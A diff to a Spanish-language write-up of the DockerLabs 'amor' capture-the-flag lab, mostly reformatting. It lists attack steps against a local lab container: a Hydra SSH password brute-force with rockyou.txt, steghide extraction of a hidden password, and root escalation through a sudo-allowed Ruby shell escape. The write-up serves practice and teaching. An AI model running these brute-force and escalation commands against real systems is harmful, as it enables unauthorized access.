@@ -28,22 +28,27 @@ Este laboratorio forma parte de la plataforma DockerLabs y corresponde a un reto
 2. Explicar en detalle cada uno de los comandos empleados en el anterior CTF; realizando un desglose del mismo y citando al menos tres alternativas (si aplica) de variantes del comando para las herramientas empleadas, este punto amplia el ejercicio anterior.
    
 ## RTA. 🚚 Despliegue del Laboratorio
+🚚 Despliegue del Laboratorio
 Transferir los archivos del reto:
 
-scp -r amor kali@192.168.1.12:/home/kali/Documents/
 
+scp -r amor kali@192.168.1.12:/home/kali/Documents/
 Descomprimir recursos (si aplica):
+
 
 unzip amor.zip
 Otorgar permisos y ejecutar:
+
 
 chmod +x auto_deploy.sh
 ./auto_deploy.sh amor.tar
 🔍 Reconocimiento
 Obtener interfaz:
 
+
 ip add
 Descubrimiento de red:
+
 
 sudo netdiscover -i docker0 -r 172.17.0.0/24
 Escaneo de puertos:
@@ -60,11 +65,9 @@ Usuarios encontrados en el HTML del sitio: carlota y juan.
 
 Ataque SSH usando Hydra:
 
-bash
-Copier
-Modifier
 hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
 Accedemos vía SSH:
+
 
 ssh carlota@172.17.0.2
 🖼 Extracción de Evidencia
@@ -78,6 +81,7 @@ Transferimos la imagen:
 scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor
 Inspeccionamos el tipo de archivo:
 
+
 file imagen.jpg
 🕵‍♀ Esteganografía
 Extraemos información oculta:
@@ -86,10 +90,9 @@ Extraemos información oculta:
 steghide extract -sf imagen.jpg
 Decodificamos el contenido del archivo secreto:
 
+
 echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
-
 🧑‍💻 Escalamiento de Privilegios
-
 Accedemos como otro usuario:
 
 
@@ -104,9 +107,8 @@ Acceso a bash mediante Ruby:
 sudo /usr/bin/ruby -e 'exec "/bin/bash"'
 Verificamos identidad:
 
+
 whoami
-
-
 
 🧾 Cuadro de Herramientas Utilizadas
 Se puede consultar el siguiente archivo Excel para la definición, funcionalidad y casos de uso de cada herramienta empleada: Resumen_Herramientas_DockerLabs.xlsx.
